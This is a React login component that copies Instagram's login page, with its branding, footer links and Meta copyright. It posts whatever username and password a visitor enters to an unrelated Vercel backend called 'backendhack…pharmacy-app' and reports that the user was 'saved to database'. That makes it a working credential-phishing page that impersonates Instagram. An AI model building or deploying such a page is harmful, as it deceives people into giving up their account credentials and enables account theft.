import React, { useState } from 'react'
import axios from 'axios'
import './App.css'

// FINAL COMPONENT - 2024-03-29-22:57 - CACHE BREAKER
const LoginComponentNew = ({ onLoginSuccess }) => {
  console.log('🔥 CACHE BREAKER - Component loaded at:', new Date().toISOString())
  
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [errors, setErrors] = useState({})

  const API_URL = 'https://backendhackbackendhack2026-a39fb32cd-pharmacy-app.vercel.app/api/login'

  console.log('🔥 NEW COMPONENT - API URL:', API_URL)

  const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(email)
  }

  const validateMobileNumber = (mobile) => {
    const mobileRegex = /^\d{10,15}$/
    return mobileRegex.test(mobile)
  }

  const validateForm = () => {
    const newErrors = {}
    
    if (!username.trim()) {
      newErrors.username = 'Mobile number, username or email is required'
    } else if (username.includes('@')) {
      if (!validateEmail(username)) {
        newErrors.username = 'Please enter a valid email address'
      }
    } else if (/^\d+$/.test(username)) {
      if (!validateMobileNumber(username)) {
        newErrors.username = 'Please enter a valid mobile number (10-15 digits)'
      }
    } else {
      if (username.length < 3) {
        newErrors.username = 'Username must be at least 3 characters'
      }
    }
    
    if (!password.trim()) {
      newErrors.password = 'Password is required'
    } else if (password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters'
    }
    
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleLogin = async (e) => {
    e.preventDefault()
    
    if (!validateForm()) {
      return
    }
    
    setLoading(true)
    setMessage('')
    
    try {
      console.log('🚀 Sending request to:', API_URL)
      const response = await axios.post(API_URL, {
        username,
        password
      })
      setMessage('Login successful! User saved to database.')
      console.log('✅ Response:', response.data)
      
      setTimeout(() => {
        onLoginSuccess()
      }, 1500)
    } catch (error) {
      setMessage('Login failed. Please try again.')
      console.error('❌ Error:', error)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="left-panel">
          <div className="logo-section">
            <div className="instagram-logo">
              <div className="camera-icon">📷</div>
              <span>Instagram</span>
            </div>
            <p className="tagline">See everyday moments from your close friends.</p>
            <div className="image-collage">
              <div className="collage-img img1"></div>
              <div className="collage-img img2"></div>
              <div className="collage-img img3"></div>
            </div>
          </div>
        </div>
        
        <div className="right-panel">
          <div className="login-form">
            <div className="form-header">
              <div className="instagram-logo-small">
                <div className="camera-icon-small">📷</div>
                <span>Instagram</span>
              </div>
            </div>
            
            <form onSubmit={handleLogin}>
              <input
                id="username"
                name="username"
                type="text"
                placeholder="Mobile number, username or email address"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className={errors.username ? 'error' : ''}
                autoComplete="username"
              />
              {errors.username && <div className="error-message">{errors.username}</div>}
              
              <input
                id="password"
                name="password"
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={errors.password ? 'error' : ''}
                autoComplete="current-password"
              />
              {errors.password && <div className="error-message">{errors.password}</div>}
              
              <button type="submit" disabled={loading}>
                {loading ? 'Logging in...' : 'Log in'}
              </button>
            </form>
            
            {message && <div className="message">{message}</div>}
            
            <div className="form-links">
              <a href="#" className="forgot-password">Forgotten password?</a>
            </div>
            
            <div className="divider">
              <div className="line"></div>
              <span>OR</span>
              <div className="line"></div>
            </div>
            
            <button className="facebook-login">
              <span className="facebook-icon">f</span>
              Log in with Facebook
            </button>
            
            <div className="signup-link">
              <span>Don't have an account?</span>
              <a href="#">Sign up</a>
            </div>
          </div>
          
          <div className="app-download">
            <p>Get the app.</p>
            <div className="app-buttons">
              <button className="app-store">App Store</button>
              <button className="google-play">Google Play</button>
            </div>
          </div>
        </div>
      </div>
      
      <footer className="footer">
        <div className="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div className="footer-meta">
          <span>© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}

export default LoginComponentNew
